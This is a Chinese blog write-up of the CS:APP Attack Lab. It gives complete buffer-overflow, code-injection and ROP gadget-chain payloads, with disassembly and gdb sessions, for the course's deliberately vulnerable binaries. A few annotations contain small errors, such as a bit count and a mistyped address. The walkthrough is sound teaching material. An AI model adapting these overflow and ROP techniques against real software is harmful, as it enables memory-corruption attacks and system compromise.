+++
title = "Attacklab"
date = 2025-11-11T20:00:48+08:00
draft = false
author = "Anfsity"
tags = [
    "",
]
categories = [
    "",
]
description = ""
image = ""
hidden = true
+++

## Introduction

正如名字，Attack Lab 需要你攻击总计 2 个有不同安全漏洞的程序，共有 5 个 phase，前 3 个 phase 需要你注入攻击代码；而后两个 phase 则需要通过 ROP (Return-Oriented Programming) 实现。

这个 Lab 里你将学到 ：

 - 深入理解程序的帧栈调用
 - 缓冲区溢出的危害
 - 对调试工具的进一步熟悉

Lab 让我体验了一把黑客的攻击方法，确实也是在黑框框里面敲敲敲，却没有了小时候感觉的那么帅气。话说回来，Attack Lab 整体难度比 Bomb Lab 稍低，整体质量依旧在线。

Lab 准备了两个 target，一个 gadget farm 和一个帮助转化输入字节码的 hex2raw 程序。

## Logistics

- [Write up](http://csapp.cs.cmu.edu/3e/attacklab.pdf)
- [selfstudy-handout](https://csapp.cs.cmu.edu/3e/archlab-handout.tar)
- [PPT](https://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/lectures/09-machine-advanced.pdf)

本次实验借助 Writeup 即可完成。

## Part I

### Phase 1

Phase 1 的目标是调用 `touch1` 函数，帮助你熟悉流程。

照例 ：

```bash
objdump -d ctarget > ctarget.asm
objdump -d rtarget > rtarget.asm
```

看 test 反汇编 ：

```asm
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	call   4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	call   400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  401990:	c3                   	ret
```

Writeup 中给出 `test` 和 `touch1` 的代码 ：

```c
void test() {
  int val;
  val = getbuf();
  printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

与详细的建议。

进入 `getbuf` 函数：

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

`getbuf` 函数很简单。在这个 phase，我们的思路是利用缓冲区溢出来实现跳转，可以分析出整个的帧栈结构 ：

![image](https://i.111666.best/image/A3fPAUNjoo7CrTFGqvcweh.png)

这说明 `getbuf` 只开辟了 40 bytes 的缓冲区，借助缓冲区溢出，我们可以把数据覆盖到返回地址 ：

![image](https://i.111666.best/image/1ZkM7uuzFPUHkrteq81t0h.png)

在这里 `ret` 指令等效于一系列指令：先将 `rsp` 里面的内容复制给 `rip` ，再把 `rsp` 加上 `0x8` 。

`rip` 作为 `pc` 会自动执行下一个输入。

于是乎，我们只需要将返回地址覆盖，就可以实现跳转到 `touch1` 的功能了。

编写答案 ：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

进行攻击 ：

![image](https://i.111666.best/image/JdQIFcJVQhfoOZ8zKBL4zI.png)

小试牛刀！

### Phase 2

我们的任务是调用 `touch2` ，并将我们的 `cookie` 作为参数传入。

回想我们的知识，`rdi` 作为第一个参数寄存器，理所应当的作为 `cookie` 的传入寄存器。

我们的思路就转变为如何将 `cookie` 传入 `rdi`。

回想之前的 phase 1，我们仅仅修改了返回地址，那么这个缓冲区有没有说法呢？

不妨利用缓冲区的内部，如果将返回地址设置回缓冲区开始，那么缓冲区的内容就会自动识别为操作指令。

编写如下脚本方便我们打印机器码 ：

```bash
#! /bin/bash

name=$(basename "$1" .s)
objFile="${name}.o"
dumpFile="${name}.d"

gcc -c -o "$objFile" "$1"
objdump -d "$objFile" > "$dumpFile"

cat "$dumpFile"
```

使用 `gdb` 进入到 `getbuf` 查看 `rsp` 地址。

```
(gdb) disas
Dump of assembler code for function getbuf:
=> 0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    ret
End of assembler dump.
(gdb) p/x $rsp
$1 = 0x5561dca0
(gdb) ni
14      in buf.c
(gdb) p/x $rsp
$2 = 0x5561dc78
```

缓冲区以 `0x5561dc78` 开头，我们构造如下代码 ：

```
movq $0x59b997fa, %rdi
pushq $0x4017ec
ret
```

构造机器码 ：

```bash
 ./gen.sh answer2.s
answer2.s: Assembler messages:
answer2.s: Warning: end of file not at end of a line; newline inserted

answer2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          push   $0x4017ec
   c:   c3                      ret

```

整理一下 ：

```asm
48 c7 c7 fa 97 b9 59 	/* mov    $0x59b997fa,%rdi */
68 ec 17 40 00       	/* push   $0x4017ec */
c3                   	/* ret */
00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 /* 0x5561dc78 */
```

当然，`push` 指令本质是把返回地址压入到了栈里面，我们第一次从 `getbuf` 函数 `ret` 后，`rsp` 会加上 `0x8` ，我们同样可以借助缓冲区溢出把返回地址丢到栈上。

利用这个思路构造如下代码也是可行的 ：

```asm
48 c7 c7 fa 97 b9 59 	/* mov    $0x59b997fa,%rdi */
c3                   	/* ret */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 /* 0x5561dc78 */
ec 17 40 00 00 00 00 00 /* 0x4017ec */
```

### Phase 3

在 Phase 3 ，我们需要把 `cookie` 作为字符串传入 `touch3` 函数，随便写个代码打印出我们 `cookie` 对应 ASCII 码的 16 进制值为 `35 39 62 39 39 37 66 61` 。

`hexmatch` 函数如下：

```
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval) {
  char cbuf[110];
  /* Make position of check string unpredictable */
  char *s = cbuf + random() % 100;
  sprintf(s, "%.8x", val);
  return strncmp(sval, s, 9) == 0;
}
```

`s` 的位置是随机的，所以我们没法修改 `s` 里面的值。

Writeup 提示我们 ：

 > When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.

和

 > Your injected code should set register %rdi to the address of this string.

我们需要解决的问题是在栈上哪个地方放置我们的 `cookie` ，再把 `cookie` 的地址传入 `rdi`。

在 `touch3` 函数中可以看到 `rsi` 被赋值为 `rdi` 。

由于不知道 `hexmatch` 函数会修改栈上的哪些地方，我们使用 `gdb` 深入调试。

首先我们要进入 `hexmatch` 函数，先利用缓冲区跳转进 `touch3` 函数。由于我们要观察栈上情况的变化，我们给栈丢点特殊值进去方便观察。

```
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
fa 18 40 00 00 00 00 00
```

观察栈里面的变化情况 ：

![image](https://i.111666.best/image/DE83Q7jqvZseV5bumT2Gbu.png)

![image](https://i.111666.best/image/SpuxhO7paAc1qEsoOltDX4.png)

在 `hexmatch` 中，有如下

```
000000000040184c <hexmatch>:
  40184c:	41 54                	push   %r12
  40184e:	55                   	push   %rbp
  40184f:	53                   	push   %rbx
  401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
  401854:	41 89 fc             	mov    %edi,%r12d
  401857:	48 89 f5             	mov    %rsi,%rbp
  40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401861:	00 00 
  401863:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
  401868:	31 c0                	xor    %eax,%eax
  40186a:	e8 41 f5 ff ff       	call   400db0 <random@plt>
  40186f:	48 89 c1             	mov    %rax,%rcx
  401872:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx
  401879:	0a d7 a3 
  40187c:	48 f7 ea             	imul   %rdx
  40187f:	48 01 ca             	add    %rcx,%rdx
  401882:	48 c1 fa 06          	sar    $0x6,%rdx
  401886:	48 89 c8             	mov    %rcx,%rax
  401889:	48 c1 f8 3f          	sar    $0x3f,%rax
  40188d:	48 29 c2             	sub    %rax,%rdx
  401890:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax
  401894:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  401898:	48 c1 e0 02          	shl    $0x2,%rax
  40189c:	48 29 c1             	sub    %rax,%rcx
  40189f:	48 8d 1c 0c          	lea    (%rsp,%rcx,1),%rbx
  4018a3:	45 89 e0             	mov    %r12d,%r8d
  4018a6:	b9 e2 30 40 00       	mov    $0x4030e2,%ecx
  4018ab:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
  4018b2:	be 01 00 00 00       	mov    $0x1,%esi
  4018b7:	48 89 df             	mov    %rbx,%rdi
  4018ba:	b8 00 00 00 00       	mov    $0x0,%eax
  4018bf:	e8 ac f5 ff ff       	call   400e70 <__sprintf_chk@plt>
  4018c4:	ba 09 00 00 00       	mov    $0x9,%edx
  4018c9:	48 89 de             	mov    %rbx,%rsi
  4018cc:	48 89 ef             	mov    %rbp,%rdi
  4018cf:	e8 cc f3 ff ff       	call   400ca0 <strncmp@plt>
  4018d4:	85 c0                	test   %eax,%eax
  4018d6:	0f 94 c0             	sete   %al
  4018d9:	0f b6 c0             	movzbl %al,%eax
  4018dc:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
  4018e1:	64 48 33 34 25 28 00 	xor    %fs:0x28,%rsi
  4018e8:	00 00 
  4018ea:	74 05                	je     4018f1 <hexmatch+0xa5>
  4018ec:	e8 ef f3 ff ff       	call   400ce0 <__stack_chk_fail@plt>
  4018f1:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
  4018f5:	5b                   	pop    %rbx
  4018f6:	5d                   	pop    %rbp
  4018f7:	41 5c                	pop    %r12
  4018f9:	c3                   	ret
```

第一次对 `rsp` 做运算是将 `rsp -= 128` 。

不用 `sub` 的原因是因为如果用 `sub` 那么这个指令就要用 7 个字节编码，而现在只用了 4 个。同理后面对 `rsp += 128` 也是一样的原因。

因为 3 位储存了 `-128 ~ 127` ，如果要表示 `128` 就需要拓展到 32 位。

还有一次是金丝雀值储存到了 `rsp + 0x78` ：

```gdb
p/x $rsp + 0x78
$1 = 0x5561dc78
```

我就不画帧栈图了，大概就是，经过一系列跳转后，`rsp` 的位置会在 `0x556dc00` 。

这个地址 `0x5561dc78` 是我们缓冲区的开始。

接着我们看完 `hexmatch` 函数的全程，如上面的图二所示。

过程中似乎没有其他地方的帧栈变化，我们猜测从 `0x5561dca8` 开始没有改动，尝试编写：

```
48 c7 c7 a8 dc 61 55 	/* mov    $0x5561dca8,%rdi */
68 fa 18 40 00       	/* push   $0x4018fa */
c3                   	/* ret */
ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
78 dc 61 55 00 00 00 00 /* 0x5561dc78 */
35 39 62 39 39 37 66 61 /* cookie */

/*
0x5561dca8
*/
```

成功。

![image](https://i.111666.best/image/XWDZj71OkDHl1lm49KZJdK.png)

从这个地址开始的地址都可以用来存放 `cookie` 。

## Part 2

在 Part 2 部分，我们需要利用 ROP 进行攻击。这部分的 `target` 对栈里面的内容进行了保护和运行时将地址随机化。我们没有办法再利用缓冲区来执行我们的代码和硬编码跳转地址了。

但是，在整个汇编代码中，有很多这样的 `gadget`，特别是在函数结尾 ：

``` asm
...
ret
```

这些 `...` 可能是 `popq %rax` 或者其他机器码，我们可以利用这样的 `gadget` 来执行我们的目的。

也就是说，我们的策略从注入可执行代码转变为利用程序本身的可执行代码。

如果我们有一系列的 `gadget` ，我们就可以构造出一系列的跳转指令来达到我们的目的。

接下来的两个 Phase 就是利用了这种思想。

![image](https://i.111666.best/image/ag5ylYxpp1ye9iXGE2mHtP.png)

最后，先看 Writeup ！

### Phase 4

我们在 `rtarget.asm` 里面可以看到一系列的 `gadget` ，这是 Lab 的作者精心设计给我们的。这些 `gadget` 也可以由 `farm.c` 反汇编而来。Writeup 中要求我们禁止使用除了 `farm.c` 里面以内的 `gadget` 代码。

我们把这些 `gadget` 粘到 `farm.c` 里面来方便我们调试。

Phase 4 的要求和 Phase 2 的要求是一样的，所以我们的思路也是一样的，只不过手段从注入可执行代码转变为利用 ROP。

由于无法使用栈里面的内存，我们只能利用缓冲区溢出来跳转到我们的第一个 `gadget` 。

Writeup 里面说，我们只需要用两个 `gadget` 就可以实现这个 Phase。

![image](https://i.111666.best/image/TmZdiO1UxpQi0ti7V5Xt44.png)

总的来说，`cookie` 还是要存到 `rdi` 里面去，我们看看有哪些 `gadget` 里面编码了 `rdi`。

经过一系列查找替换，我们找到了一个 `gadget` ：

```
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  movq rax, rdi
  nop
  4019c9:	c3                   	ret
  ret
```

这个 `gadget` 可以被解释为 ：

```
  movq rax, rdi
  nop
  ret
```

由于这是唯一的一个操作 `rdi` 的 `gadget` ，我们逆向查找 `rax` ，就在这个 `gadget` 的下面 ：

```asm
00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  popq rax
  nop
  ret
  4019cf:	c3                   	ret
```

`popq %rax` 会把 `rsp` 里面的内容复制给 `rax` ，这样我们就凑齐了我们的拼图了。

编写如下指令：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00 /* 0x4019cc: 58 90 c3 -> popq rax, nop, ret */
fa 97 b9 59 00 00 00 00 /* 0x59b997fa */
c5 19 40 00 00 00 00 00 /* 0x4019c5: 48 89 c7 90 c3 -> movq rax, rdi, nop, ret */
ec 17 40 00 00 00 00 00 /* 4017ec */
```

成功攻击 `touch2` 。

事实上，因为可以借鉴 Phase 2 的思路，我觉得 Phase 4 可能比 Phase 2 还简单一些。

### Phase 5

在 Phase 5 阶段，我们面临的困境要更为艰巨，由于栈上内存访问被禁止和地址随机化，我们不得不从一堆 `gadget` 里面拼凑出我们想要达成的目的。

由于 `gadget` 很多，一开始难免很难下手，我们可以采用一个笨办法 ：把所有的 `gadget` 一对一的翻译出来。

当然，我们也不完全是到处乱找，比如我们知道最后一个寄存器肯定是 `rdi` ，中间的跳转过程大概率要用到 `rax` ，`rsp` 。

总之，经过一番枯燥的重复过程后，我们可以提取出几个有意义的 `gedget` 出来 ：

![image](https://i.111666.best/image/hq4uV88WlTaqB48UifgD02.png)

这里有一个很特殊的 `gadget` ，他被直接解释为 `lea` 而没有在 Writeup 的那张表上出现。

我们可以看出这里面有几个连续的跳转链 ：`eax` -> `edx` -> `ecx` -> `esi` ，`rsp` -> `rax` -> `rdi` 。

`test` `or` 指令不会改变寄存器的值，这里我们可以忽略他们。

经过一系列的排除法，我们最终可以构造出一个有意义的跳转链：

![image](https://i.111666.best/image/9UfgVnlUUvyFHk1Qre1YKa.png)

我省略了其中的 `ret` 指令以便于阅读，这很像拼拼图，还挺好玩的。

这里的思路是，先保存初始的 `rsp` 值，然后计算出 `cookie` 地址到初始 `rsp` 的偏移量。

我们所拥有的 `gadget` 恰好够我们构造出一个这样严谨的跳转链。经过计算可以得出，这里的 `offset` 应该要是 `0x48`。

![image](https://i.111666.best/image/p4tUvrqnUcnlCVXfYRh0Vz.png)

再对照汇编地址，我们构造出如下代码 ：

```
3f 3f 3f 3f 3f 3f 3f 3f
3f 3f 3f 3f 3f 3f 3f 3f
3f 3f 3f 3f 3f 3f 3f 3f
3f 3f 3f 3f 3f 3f 3f 3f
3f 3f 3f 3f 3f 3f 3f 3f
06 1a 40 00 00 00 00 00 /* 401a03 + 3 */
/*
0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  movq %rsp, %rax
  401a09:	c3                   	ret
*/
a2 19 40 00 00 00 00 00 /* 4019a0 + 2 */
/*
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	ret
  movq %rax, %rdi
  48878d
*/
cc 19 40 00 00 00 00 00 /* 4019ca + 2 */
/*
00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  popq rax
  nop
  ret
  4019cf:	c3                   	ret
*/
48 00 00 00 00 00 00 00 /* 0x48 */
dd 19 40 00 00 00 00 00 /* 4019db + 2 */
/*
00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  popq rsp
  movl %eax, %edx
  nop
  4019e0:	c3                   	ret
*/
34 1a 40 00 00 00 00 00 /* 401a33 + 1 */
/*
0000000000401a33 <getval_159>:
  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
  movl %edx, %ecx
  cmpb %cl, %cl
  401a38:	c3                   	ret
*/
13 1a 40 00 00 00 00 00 /* 401a11 + 2 */
/*
0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  movl %ecx, %esi
  401a17:	c3                   	ret
*/
d6 19 40 00 00 00 00 00 /* 4019d6 */
/*
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	ret
*/
a2 19 40 00 00 00 00 00 /* 4019a0 + 2 */
/*
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	ret
  movq %rax, %rdi
  48878d
*/
fa 18 40 00 00 00 00 00 /* 4018fa */
/*
00000000004018fa <touch3>:
*/
35 39 62 39 39 37 66 61 /* cookie */
```

搞定。

![image](https://i.111666.best/image/vUEWBGwDI1Qnqmtq8VK2jx.png)

![image](https://i.111666.best/image/pyt0cENjSlRSGOpb601Y92.png)
